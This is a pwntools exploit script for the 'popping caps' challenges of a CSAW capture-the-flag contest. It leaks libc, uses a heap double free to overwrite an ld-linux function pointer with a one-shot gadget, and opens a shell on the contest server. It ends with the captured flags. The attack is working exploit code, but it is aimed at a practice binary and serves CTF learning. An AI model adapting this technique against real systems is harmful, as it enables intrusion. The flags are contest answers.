#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.chal.csaw.io --port 1001 ./popping_caps
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./popping_caps')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.chal.csaw.io'
# popping caps
port = int(args.PORT or 1001)
# popping caps 2
port = int(args.PORT or 1008)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x555555554c44
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

def menu(idx):
    io.recvuntil("Your choice: ")
    io.sendline(str(idx))

def malloc(size):
    menu(1)
    io.recvuntil("How many: ")
    io.sendline(str(size))

def free(idx):
    menu(2)
    io.recvuntil("free: ")
    io.sendline(str(idx))

def write(data):
    menu(3)
    io.recvuntil("in: ")
    io.send(data)

io.recvuntil("system ")
leak = int(io.recvline()[:-1], 16)
libc = ELF("./libc.so.6")
libc.address = leak - libc.symbols["system"]

log.success("libc base: {:#x}".format(libc.address))

ld_addr = libc.address + 0x3f1000
# function pointer called in ld-linux
dl_func = ld_addr + 0x228f68
log.info("ld-linux @ {:#x}".format(ld_addr))

target = ld_addr + 0x228fa8 + 8
size = 0x30

log.info("target: {:#x}".format(target))

# double free
free(target)
free(target)

malloc(size)
write(p64(dl_func))
malloc(size)
malloc(size)

# one-shot gadget
boom = libc.address + 0x4f322

raw_input("lol")
write(p64(boom))

io.interactive()

# 1: flag{1tsh1ghn000000000n}
# 2: flag{don_t_you_wish_your_libc_was_non_vtabled_like_mine_29}
